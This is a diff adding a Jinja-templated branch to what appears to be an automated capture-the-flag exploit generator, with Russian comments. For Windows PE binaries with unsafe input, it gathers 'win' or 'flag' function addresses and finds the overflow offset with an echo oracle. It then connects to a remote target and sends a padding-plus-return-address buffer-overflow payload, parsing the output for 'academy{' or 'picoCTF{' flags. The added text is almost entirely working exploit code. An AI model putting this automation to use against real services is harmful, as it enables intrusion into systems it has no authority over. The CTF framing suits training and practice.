@@ -1,0 +1,57 @@
+{% elif 'PE' in vuln_indicators.get('binary_type', '') and vuln_indicators.has_dangerous_input %}
+    log.warning(" Обнаружен Windows PE-бинарник с уязвимостью ввода! Включаю автопилот...")
+    import sys, os, time
+    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
+    from modules.pe_handler import setup_pe_context, is_pe_file
+    from modules.offset_oracle import find_offset_with_echo
+    
+    # Настраиваем контекст для PE
+    if is_pe_file('./{{ binary }}'):
+        setup_pe_context('./{{ binary }}')
+    else:
+        context.arch = 'i386'
+    
+    # Определяем целевые адреса
+    target_addrs = []
+    {% if target_function %}
+    target_addrs.append(({{ target_function.address }}, "{{ target_function.name }}"))
+    {% endif %}
+    {% for func in functions %}
+    {% if 'win' in func.name.lower() or 'flag' in func.name.lower() %}
+    target_addrs.append(({{ func.address }}, "{{ func.name }}"))
+    {% endif %}
+    {% endfor %}
+    
+    if not target_addrs:
+        log.error("️ Не найдены целевые функции (win/flag).")
+        exit(1)
+    
+    log.info(f" Целевые адреса: {target_addrs}")
+    
+    # Используем эхо-оракул для поиска OFFSET
+    log.info("🔍 Запускаем эхо-оракул для поиска точного OFFSET...")
+    result = find_offset_with_echo('{{ target_host }}', {{ target_port }}, target_addrs)
+    
+    if result:
+        offset, addr, name = result
+        log.success(f"✅ Найден OFFSET: {offset}, переход на {name} ({hex(addr)})")
+        
+        # Финальный эксплойт с найденным OFFSET
+        io = remote('{{ target_host }}', {{ target_port }})
+        time.sleep(0.5)
+        
+        if context.arch == 'i386':
+            payload = b'A' * offset + p32(addr)
+        else:
+            payload = b'A' * offset + p64(addr)
+        
+        io.sendline(payload)
+        flag = io.recvall(timeout=3).decode('utf-8', errors='ignore')
+        
+        if "academy{" in flag or "picoCTF{" in flag:
+            log.success(f"🏆 ФЛАГ: {flag.strip()}")
+        else:
+            log.warning("Флаг не найден в выводе.")
+    else:
+        log.error("️ Не удалось найти OFFSET через эхо-оракул.")
+
